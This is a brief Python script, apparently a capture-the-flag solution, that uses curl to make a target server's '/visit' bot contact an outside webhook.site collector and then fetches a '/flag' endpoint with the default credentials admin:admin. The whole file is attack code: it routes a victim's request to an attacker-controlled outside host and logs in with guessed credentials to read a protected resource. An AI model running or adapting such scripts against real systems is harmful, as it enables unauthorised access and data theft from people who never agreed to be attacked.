import os
import time

os.system('curl http://172.31.13.148:8080/visit -X POST -H "X-Target: http://webhook.site/3e56c461-34bd-42ff-bd00-dc344d08d1bd"')
time.sleep(10)
os.system('curl -u admin:admin http://172.31.13.148:8080/flag')
